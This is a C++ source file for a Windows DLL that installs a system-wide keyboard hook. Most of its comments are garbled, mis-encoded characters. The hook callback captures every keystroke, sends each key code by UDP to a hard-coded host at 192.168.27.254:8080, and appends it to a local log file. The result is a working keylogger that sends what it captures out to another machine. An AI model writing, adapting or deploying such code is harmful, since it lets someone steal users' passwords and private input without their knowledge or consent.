// hookdll.cpp : ���� DLL Ӧ�ó���ĵ���������
//

#include "stdafx.h"
#include <stdio.h>
#include "pub.h"
__declspec(dllexport) void WINAPI InstallLanuchEv()//dll��������
{
	//HMODULE hHookDll =LoadLibrary("hookdll");//�õ�dll�ľ��
	Hook=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)LauncherHook,hHookDll,0);//ϵͳ��װ
	if(Hook==NULL)
	{
		savelog("error");
	}
}
//�ص�����
LRESULT CALLBACK LauncherHook(int nCode,WPARAM wParam,LPARAM lParam)
{
	LRESULT Result=CallNextHookEx(Hook,nCode,wParam,lParam);
	if(nCode==HC_ACTION)
	{
		char buf[100];
		memset(buf,0,sizeof(buf));
		sprintf(buf,"%u",wParam);
		send_udp(buf);//��Զ����������
		memset(buf,0,sizeof(buf));
		sprintf(buf,"%x\t%c\t%08x\n",wParam,wParam,lParam);
		savelog(buf);
	}
}
void send_udp(const char *s)//target server send message
{
	init_socket();
	SOCKET st=create_send_socket();
	send_work(st,"192.168.27.254",8080,s);
	close_socket(st);
}
void savelog(const char *s)
{
	FILE *p=fopen("D:\\my.log","a+");
	fputs(s,p);
	fclose(p);
}



















